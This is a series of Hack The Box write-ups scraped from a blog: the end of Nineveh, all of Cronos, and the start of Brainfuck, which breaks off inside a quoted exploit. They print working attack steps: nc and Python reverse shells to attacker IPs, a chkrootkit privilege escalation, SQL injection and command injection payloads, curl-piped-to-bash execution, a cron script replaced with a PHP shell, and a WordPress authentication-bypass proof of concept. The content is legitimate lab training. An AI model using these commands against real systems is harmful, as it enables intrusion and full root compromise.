root@SittingDucks:/home/user/Documents/htb/boxes/nineveh# binwalk -Me nineveh.png Scan Time: 2020-01-19 15:16:04 Target File: /home/user/Documents/htb/boxes/nineveh/nineveh.png MD5 Checksum: 353b8f5a4578e4472c686b6e1f15c808 Signatures: 391 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced 84 0x54 Zlib compressed data, best compression 2881744 0x2BF8D0 POSIX tar archive (GNU) Scan Time: 2020-01-19 15:16:04 Target File: /home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/54 MD5 Checksum: d41d8cd98f00b204e9800998ecf8427e Signatures: 391 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- Scan Time: 2020-01-19 15:16:04 Target File: /home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret/nineveh.priv MD5 Checksum: f426d661f94b16292efc810ebb7ea305 Signatures: 391 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PEM RSA private key Scan Time: 2020-01-19 15:16:04 Target File: /home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret/nineveh.pub MD5 Checksum: 6b60618d207ad97e76664174e805cfda Signatures: 391 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 OpenSSH RSA public key root@SittingDucks:/home/user/Documents/htb/boxes/nineveh# ll total 2840 -rwxrwxrwx 1 root root 2891984 Jan 19 15:09 nineveh.png drwxrwxr-x 3 root root 4096 Jan 19 15:16 _nineveh.png.extracted -rwxr-xr-x 1 root root 514 Jan 5 08:32 post.html -rwxr-xr-x 1 root root 3251 Jan 19 11:59 shell.php root@SittingDucks:/home/user/Documents/htb/boxes/nineveh# cd _nineveh.png.extracted/ root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted# ll total 2844 -rw-rw-r-- 1 root root 10240 Jan 19 15:16 2BF8D0.tar -rw-rw-r-- 1 root root 0 Jan 19 15:16 54 -rw-rw-r-- 1 root root 2891900 Jan 19 15:16 54.zlib drwxr-xr-x 2 www-data www-data 4096 Jul 2 2017 secret root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted# cd secret/ root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret# ll total 8 -rw------- 1 www-data www-data 1675 Jul 2 2017 nineveh.priv -rw-r--r-- 1 www-data www-data 400 Jul 2 2017 nineveh.pub There is a private/public key pair we can potentially use to ssh to the box. We can try to use the user amrois we found in the /etc/passwd output. Our initial nmap had not revealed port 22 as opened but I remembered that when I ran LinEnum.sh I saw this: [-] Listening TCP: Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - In reality port 22 is listening as we can see above. The reason the nmap did not reveal is because of iptables which only allows connections for port 80 and 443: www-data@nineveh:/$ cat /etc/iptables/rules.v4 # Generated by iptables-save v1.6.0 on Sun Jul 2 19 :37:15 2017 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [140:21895] -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT -A INPUT -j DROP COMMIT # Completed on Sun Jul 2 19 :37:15 2017 I went back to LinEnum output and I found that the knockd daemon is running: root 1282 1.1 0.2 8756 2228 ? Ss 04:11 2:52 /usr/sbin/knockd -d -i ens33 and the below could be the configuration file: -rw-r--r-- 1 root root 354 Aug 5 2017 /etc/knockd.conf The knockd daemon is needed to have the so called Port Knocking mechanism work properly. Port knocking is a mechanism used to enable remote access without leaving a port open constantly. This helps protecting a port being used from port scanning. To use port knocking, the server must have a firewall and run the knock-daemon, /usr/sbin/knockd. The daemon is listening for a specific sequence of TCP or UDP packets, if the sequence of packets is correct, then usually the source IP address of the port knocking is given access through the firewall to the assigned knocking port. www-data@nineveh:/home$ cat /etc/knockd.conf [options] logfile = /var/log/knockd.log interface = ens33 [openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn From the above configuration file we can see that the port sequense for openSSH is 571, 290, 911. If our kali machine sends three TCP packets to these ports in this exact sequence then port 22 will be open. root@SittingDucks:~# nmap -p 22 10 .10.10.43 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 18:53 GMT Nmap scan report for nineveh.htb (10.10.10.43) Host is up (0.024s latency). PORT STATE SERVICE 22/tcp filtered ssh Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds Before starting to test this, we can see the above output shows that port 22 is filtered (by iptables in this case). Looking online I found out that it is possible to use nmap and I found a command here which will be useful. This is the script: root@SittingDucks:/home/user/Tools# nmap -Pn --host-timeout 100 --max-retries 0 -p 571 ,290,911 10 .10.10.43 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 19:11 GMT Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for nineveh.htb (10.10.10.43) Host is up. PORT STATE SERVICE 290/tcp filtered unknown 571/tcp filtered umeter 911/tcp filtered xact-backup I ran the above command few times and when I check again for por 22 I get this: root@SittingDucks:/home/user/Tools# nmap -p 22 10 .10.10.43 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 19:11 GMT Nmap scan report for nineveh.htb (10.10.10.43) Host is up (0.017s latency). PORT STATE SERVICE 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds Now port 22 is open and we can try to SSH. root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret# ssh amrois@10.10.10.43 -i nineveh.priv Ubuntu 16.04.2 LTS Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 133 packages can be updated. 66 updates are security updates. You have mail. Last login: Sun Jan 19 15:15:39 2020 from 10.10.14.5 amrois@nineveh:~$ id uid=1000(amrois) gid=1000(amrois) groups=1000(amrois) Finally we are in as the user amrois and we can get the user.txt amrois@nineveh:~$ cat user.txt 82############################c8 Looking around I notice there a non-default directory calle report which is owned by the user amrois: amrois@nineveh:/$ ll total 100 drwxr-xr-x 24 root root 4096 Jul 2 2017 ./ drwxr-xr-x 24 root root 4096 Jul 2 2017 ../ drwxr-xr-x 2 root root 4096 Jul 2 2017 bin/ drwxr-xr-x 3 root root 4096 Jul 2 2017 boot/ drwxr-xr-x 19 root root 4240 Jan 19 04:11 dev/ drwxr-xr-x 93 root root 4096 Aug 5 2017 etc/ drwxr-xr-x 3 root root 4096 Jul 2 2017 home/ lrwxrwxrwx 1 root root 32 Jul 2 2017 initrd.images -> boot/initrd.images-4.4.0-62-generic drwxr-xr-x 22 root root 4096 Jul 2 2017 lib/ drwxr-xr-x 2 root root 4096 Jul 2 2017 lib64/ drwx------ 2 root root 16384 Jul 2 2017 lost+found/ drwxr-xr-x 3 root root 4096 Jul 2 2017 media/ drwxr-xr-x 2 root root 4096 Feb 15 2017 mnt/ drwxr-xr-x 2 root root 4096 Feb 15 2017 opt/ dr-xr-xr-x 208 root root 0 Jan 19 04:11 proc/ drwxr-xr-x 2 amrois amrois 4096 Jan 19 15:20 report/ drwx------ 4 root root 4096 Jul 19 2017 root/ drwxr-xr-x 23 root root 900 Jan 19 15:16 run/ drwxr-xr-x 2 root root 12288 Jul 2 2017 sbin/ drwxr-xr-x 2 root root 4096 Jan 14 2017 snap/ drwxr-xr-x 2 root root 4096 Feb 15 2017 srv/ dr-xr-xr-x 13 root root 0 Jan 19 06:11 sys/ drwxrwxrwt 9 root root 4096 Jan 19 15:20 tmp/ drwxr-xr-x 10 root root 4096 Jul 2 2017 usr/ drwxr-xr-x 14 root root 4096 Jul 2 2017 var/ lrwxrwxrwx 1 root root 29 Jul 2 2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic inside the directory there are some text files which look they are generated every minute: amrois@nineveh:/report$ ls -l total 24 -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt amrois@nineveh:/report$ ls -l total 32 -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:23 report-20-01-19:15:23.txt amrois@nineveh:/report$ ls -l total 40 -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:23 report-20-01-19:15:23.txt -rw-r--r-- 1 amrois amrois 4835 Jan 19 15:24 report-20-01-19:15:24.txt This may be an indication that a cronjob is running. amrois@nineveh:/report$ crontab -l # Edit this file to introduce tasks to be run by cron. # # Each task to run has to be defined through a single line # indicating with different fields when the task will be run # and what command to run for the task # # To define the time you can provide concrete values for # minute ( m ) , hour ( h ) , day of month ( dom ) , month ( mon ) , # and day of week ( dow ) or use '*' in these fields ( for 'any' ) .# # Notice that tasks will be started based on the cron 's system # daemon' s notion of time and timezones. # # Output of the crontab jobs ( including errors ) is sent through # email to the user the crontab file belongs to ( unless redirected ) . # # For example, you can run a backup of all your user accounts # at 5 a.m every week with: # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ # # For more information see the manual pages of crontab ( 5 ) and cron ( 8 ) # # m h dom mon dow command */10 * * * * /usr/sbin/report-reset.sh The above crontab indicates there is a script running every 10 minutes. # !/bin/bash rm -rf /report/*.txt and the above confirms this is a script that empties the report directory. We still need to find out what generates these reports. I copied some of the rows of the report on google and I found multiple results (i.e. https://www.linuxquestions.org/questions/fedora-35/when-i-chkrootkit-it-says-354711/) referring to chkrootkit . So I am pretty sure it's the application generating the reports. Having a look with searchsploit I found exploit 33899 which in summary states the following: Steps to reproduce: - Put an executable file named 'update' with non-root owner in /tmp (not mounted noexec, obviously) - Run chkrootkit (as uid 0) Result: The file /tmp/update will be executed as root, thus effectively rooting your box, if malicious content is placed inside the file. So I create a file named update in the /tmp directory and I punt a shell inside: amrois@nineveh:/tmp$ cat update rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 1234 >/tmp/f and after waiting around 1 minute I get the shell back: root@SittingDucks:/home/user/Tools/linenum# nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 45922 /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # cat root.txt 8a############################3a","tags":"blogging","loc":"https://sittingducks.io/Nineveh.html","title":"Nineveh"},{"url":"https://sittingducks.io/Cronos.html","text":"And here I am the first day of the year, while my family prepares the typical bomb meal, I am just starting another write-up. Cronos should be a relatively easy one so let's crack-on. Initial nmap root@SittingDucks:~# nmap -sV -sC 10 .10.10.13 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 13:04 GMT Nmap scan report for 10.10.10.13 Host is up (0.13s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Looking at the default web server page I get this: Someone left this default page there and it's quite unusual. However, I did not find any other useful info. I performed a direcorty search on the IP 10.10.10.13 with dirbuster but I did not find anything useful too: root@SittingDucks:~# gobuster dir -u http://10.10.10.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.13 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/01/01 13:55:28 Starting gobuster =============================================================== /server-status (Status: 403) =============================================================== 2020/01/01 14:32:33 Finished =============================================================== Quite often HTB uses the MachineName.htb convention for its boxes, so since I was stuck I decided to give it a try and use cronos.htb as the hostname. So I added it in the /etc/hosts and when I entered it in the browser I got this: All the links in the page point to external resources which I won't pursue as it goes beyond the HTB scope. At this point I tried another directory search with gobuster using the hostname instead. root@SittingDucks:/home/user/Documents/htb/boxes/cronos# gobuster dir -u http://cronos.htb -t 100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://cronos.htb [+] Threads: 100 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/01/01 17:51:55 Starting gobuster =============================================================== /css (Status: 301) /js (Status: 301) /server-status (Status: 403) =============================================================== 2020/01/01 17:56:08 Finished =============================================================== I had a quick look at that css and js directories but nothing interesting in there either. It looks like we have to start looking somewhere else. We have port 53/tcp (DNS) open as well so we can explore this option. dnsrecon is a great tool for DNS enumeration. Since we have an IP we want to do a reverse lookup. After few failed attempts I found the correct syntax, basically the network range has to be specified to perform a reverse lookup. root@SittingDucks:~# dnsrecon -n 10 .10.10.13 -r 10 .10.10.0/24 [*] Reverse Look-up of a Range [*] Performing Reverse Lookup from 10.10.10.0 to 10.10.10.255 [*] PTR ns1.cronos.htb 10.10.10.13 [+] 1 Records Found This can also be confirmed with nslookup: root@SittingDucks:~# nslookup > server 10 .10.10.13 Default server: 10.10.10.13 Address: 10.10.10.13#53 > 10 .10.10.13 13.10.10.10.in-addr.arpa name = ns1.cronos.htb. Now that we have this info we can try to enumerate further with a DNS zone transfer. root@SittingDucks:~# host -l cronos.htb 10 .10.10.13 Using domain server: Name: 10.10.10.13 Address: 10.10.10.13#53 Aliases: cronos.htb name server ns1.cronos.htb. cronos.htb has address 10.10.10.13 admin.cronos.htb has address 10.10.10.13 ns1.cronos.htb has address 10.10.10.13 www.cronos.htb has address 10.10.10.13 Interestingly I find some other names I can now add to out /ets/hosts file and explore. Particularly admin.cronos.htb looks interesting: I tried few obvious combinations to login without success. At this stage I decided to look manually (could have used sqlmap, burp, etc) for sql injection vulnerabilities in order to bypass the authentication using a cheat sheet available here . It did not take long. When I tried admin' # (with a random password value) as shown above I got in: So now I am logged in and I noticed that if I add a semicolon to the IP address followed by another command I will get a response from the OS, indicating that the application is vulnerable to OS command injection. Below an example with the id command: Let's now try to get a shell. I will use the following shell downloaded from pentestmonkey : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.46\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' and I will place it next to the IP address (8.8.8.8) instead of the id command. I also open a netcat listener on port 9999 on my kali box and when I click Execute I get a shell. root@SittingDucks:~# nc -lvnp 9999 listening on [any] 9999 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.10.13] 49038 /bin/sh: 0: can't access tty; job control turned off $ python -c 'import pty;pty.spawn(\"/bin/bash\");' www-data@cronos:/var/www/admin$ As shown above I also ran a python command to obtain a full shell. I then locate and read the user.txt www-data@cronos:/home/noulis$ locate user.txt locate user.txt /home/noulis/user.txt www-data@cronos:/home/noulis$ cat /home/noulis/user.txt cat /home/noulis/user.txt 51****************************3b Now it's time to root the box. I had a quick look at few directories but did not find anything interesting so I decided to run a script called LinEnum.sh that does automatic enumeration on linux. The script is located in my kali box so to run the script I opened a Simple Python Http server on my kali box in the directory where LinEnum.sh is located: root@SittingDucks:/home/user/Documents/htb/boxes/cronos# ll total 64 -rwxr-xr-x 1 root root 5493 Jan 3 20:14 artisan -rw-rw-r-- 1 root root 486 Jan 2 07:36 cronos.req -rwxrwxr-x 1 root root 46476 Jan 3 21:05 LinEnum.sh -rw-rw-r-- 1 root root 33 Jan 2 14:20 user.txt root@SittingDucks:/home/user/Documents/htb/boxes/cronos# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... then I ran this command on the Cronos box (where 10.10.14.46 is the IP of my kali machine): www-data@cronos:/$ curl 10 .10.14.46:8000/LinEnum.sh | bash curl 10.10.14.46:8000/LinEnum.sh | bash % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 46476 100 46476 0 0 114k 0 --:--:-- --:--:-- --:--:-- 114k # ######################################################## # Local Linux Enumeration & Privilege Escalation Script # # ######################################################## # www.rebootuser.com # version 0 .981 I am not pasting the whole output as it is quite long. However the most interesting bit I found it this: # m h dom mon dow user command 17 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) * * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1 particularly the last cron entry runs as root every minute. If we look at the script itself we notice it is owned by the www-data user: www-data@cronos:/var/www/laravel$ ls -l artisan ls -l artisan -rw-r--r-- 1 www-data www-data 5493 Jan 3 22:14 artisan I remove this file and replace it with a php reverse shell I found in kali (/usr/share/laudanum/php/php-reverse-shell.php). At the same time I open a netcat listener on my kali box on port 8888 and after less than I minute I get my root shell, which allows me to read the root.txt file: root@SittingDucks:~# nc -lvnp 8888 listening on [any] 8888 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.10.13] 36484 Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 23:19:02 up 1 day, 4:32, 0 users, load average: 0.03, 0.01, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=0(root) gid=0(root) groups=0(root) /bin/sh: 0: can't access tty; job control turned off # python -c 'import pty; pty.spawn(\"/bin/bash\");' root@cronos:/# id id uid=0(root) gid=0(root) groups=0(root) root@cronos:/# cat /root/root.txt cat /root/root.txt 17****************************a0","tags":"blogging","loc":"https://sittingducks.io/Cronos.html","title":"Cronos"},{"url":"https://sittingducks.io/Brainfuck.html","text":"This box was really a Brainfuck. It requires some knowledge of cryptography for you to be able to recognize patterns and get on the right track. Although I found it a bit unrealistic it is still a good box to practice your skills. My suggestion is always to try hard yourself and only when you have been stuck for a considerable amount of time look for hints. Recon root@SittingDucks:~# nmap -sV -sC 10 .10.10.17 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 07:10 GMT Nmap scan report for brainfuck.htb (10.10.10.17) Host is up (0.13s latency). Not shown: 995 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA) | 256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA) |_ 256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: UIDL AUTH-RESP-CODE USER CAPA SASL(PLAIN) PIPELINING RESP-CODES TOP 143/tcp open imap Dovecot imapd |_imap-capabilities: IDLE LOGIN-REFERRALS more IMAP4rev1 have OK Pre-login ID post-login SASL-IR listed LITERAL+ capabilities ENABLE AUTH=PLAINA0001 443/tcp open ssl/http nginx 1.10.0 (Ubuntu) |_http-server-header: nginx/1.10.0 (Ubuntu) |_http-title: 400 The plain HTTP request was sent to HTTPS port | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Not valid before: 2017-04-13T11:19:29 |_Not valid after: 2027-04-11T11:19:29 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds From the initial nmap we can observe five open ports, one of which (443) points to a webserver. Let us have a look at it. We can see the simple Nginix welcome page. From the nmap we can also see two alternative DNS names: www.brainfuck.htb and sup3rs3cr3t.brainfuck.htb . To be able to see what's behind these names we can add an entry in the /etc/hosts file of our personal box so that it can resolve them. 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback SittingDucks ff02::1 ip6-allnodes ff02::2 ip6-allrouters 127.0.1.1 SittingDucks 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb So now we can try to navigate to the first website with our browser: We can see what it looks like a wordpress website and another potential useful information could be the email orestis@brainfuck.htb . Since we are apparently dealing with wordpress then we can use the powerful wpscan tool to check for vulnerabilities or other weaknessed we can leverage. As I initilally got TLS errors I then ran a scan with the tls checks option disabled: _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.7.5 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_ _______________________________________________________________ \u001b[32m[+]\u001b[0m URL: https://brainfuck.htb/ \u001b[32m[+]\u001b[0m Started: Fri Dec 27 05:59:53 2019 Interesting Finding(s): \u001b[32m[+]\u001b[0m https://brainfuck.htb/ | Interesting Entry: Server: nginx/1.10.0 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% \u001b[32m[+]\u001b[0m https://brainfuck.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access \u001b[32m[+]\u001b[0m https://brainfuck.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% \u001b[32m[+]\u001b[0m https://brainfuck.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 \u001b[32m[+]\u001b[0m WordPress version 4.7.3 identified (Insecure, released on 2017-03-06). | Found By: Rss Generator (Passive Detection) | - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator> | - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator> \u001b[32m[+]\u001b[0m WordPress theme in use: proficient | Location: https://brainfuck.htb/wp-content/themes/proficient/ | Last Updated: 2019-12-13T00:00:00.000Z | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt | \u001b[33m[!]\u001b[0m The version is out of date, the latest version is 3.0.5 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3 | Style Name: Proficient | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof... | Author: Specia | Author URI: https://speciatheme.com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.0.6 (80% confidence) | Found By: Style (Passive Detection) | - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6' \u001b[32m[+]\u001b[0m Enumerating Vulnerable Plugins (via Passive Methods) \u001b[32m[+]\u001b[0m Checking Plugin Versions (via Passive and Aggressive Methods) \u001b[34m[i]\u001b[0m No plugins Found. \u001b[32m[+]\u001b[0m Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations -: |=======================================================| \u001b[32m[+]\u001b[0m Checking Theme Versions (via Passive and Aggressive Methods) \u001b[34m[i]\u001b[0m No themes Found. \u001b[32m[+]\u001b[0m Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations -: |=======================================================| \u001b[34m[i]\u001b[0m No Timthumbs Found. \u001b[32m[+]\u001b[0m Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups -: |========================================================| \u001b[34m[i]\u001b[0m No Config Backups Found. \u001b[32m[+]\u001b[0m Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports -: |============================================================| \u001b[34m[i]\u001b[0m No DB Exports Found. \u001b[32m[+]\u001b[0m Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \"Plain\" for those to be detected) Brute Forcing Attachment IDs -: |===================================================| \u001b[34m[i]\u001b[0m No Medias Found. \u001b[32m[+]\u001b[0m Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs -: |=======================================================| \u001b[34m[i]\u001b[0m User(s) Identified: \u001b[32m[+]\u001b[0m admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m administrator | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[33m[!]\u001b[0m No WPVulnDB API Token given, as a result vulnerability data has not been output. \u001b[33m[!]\u001b[0m You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up. \u001b[32m[+]\u001b[0m Finished: Fri Dec 27 06:01:31 2019 \u001b[32m[+]\u001b[0m Requests Done: 3109 \u001b[32m[+]\u001b[0m Cached Requests: 11 \u001b[32m[+]\u001b[0m Data Sent: 782.499 KB \u001b[32m[+]\u001b[0m Data Received: 849.91 KB \u001b[32m[+]\u001b[0m Memory used: 198.396 MB \u001b[32m[+]\u001b[0m Elapsed time: 00:01:38 There are plenty of useful info in the above output but one thing I learnt while dealing with wordpress is that people do not always update the wordpress plugins. In fact, after skimming through the list carefully and searching on the Internet, it looks like the plugin WP Support Plus Responsive Ticketing System is quite outdated (version 7.1.3) root@SittingDucks:~# searchsploit WordPress Plugin WP Support Plus Responsive --------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) --------------------------------------------- ---------------------------------------- WordPress Plugin WP Support Plus Responsive | exploits/php/webapps/34589.txt WordPress Plugin WP Support Plus Responsive | exploits/php/webapps/40939.txt WordPress Plugin WP Support Plus Responsive | exploits/php/webapps/41006.txt --------------------------------------------- ---------------------------------------- looking on searchsploit for the plugin in question I can see there are three exploits. Also seems like 41006 may be useful as it can let us login. root@SittingDucks:~# cat /usr/share/exploitdb/exploits/php/webapps/41006.txt # Exploit Title: WP Support Plus Responsive Ticket System 7 .1.3 Privilege Escalation # Date: 10 -01-2017 # Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/ # Exploit Author: Kacper Szurek # Contact: http://twitter.com/KacperSzurek # Website: http://security.szurek.pl/ # Category: web 1. Description You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie(). http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html 2. Proof of Concept <form method=\"post\" action=\"http://wp/wp-admin/admin-ajax.php\"> Username: <input type=\"text\" name=\"username\" value=\"administrator\"> <input 